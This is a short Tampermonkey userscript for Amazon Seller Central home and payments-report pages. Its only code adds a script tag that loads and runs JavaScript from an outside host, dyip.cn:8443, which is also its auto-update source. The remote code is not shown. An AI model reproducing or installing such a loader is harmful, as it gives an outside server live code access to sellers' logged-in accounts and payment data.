// ==UserScript==
// @name         amazon frontpage
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  try to take over the world!
// @author       You
// @match        https://sellercentral.amazon.com/home*
// @match        https://sellercentral.amazon.com/gp/homepage.html/*
// @match        https://sellercentral-europe.amazon.com/gp/homepage.html/*
// @match        https://sellercentral-europe.amazon.com/home*
// @match        https://sellercentral.amazon.com/payments/reports/*
// @icon         https://www.google.com/s2/favicons?domain=sellercentral.amazon.com
// @updateURL    https://dyip.cn:8443/userscripts/amazon_frontpage.user.js
// @downloadURL    https://dyip.cn:8443/userscripts/amazon_frontpage.user.js
// @grant        none
// ==/UserScript==


{
    const el = document.createElement('script')
    el.setAttribute('src', 'https://dyip.cn:8443/scripts/amazon_frontpage.js')
    document.body.append(el)
}
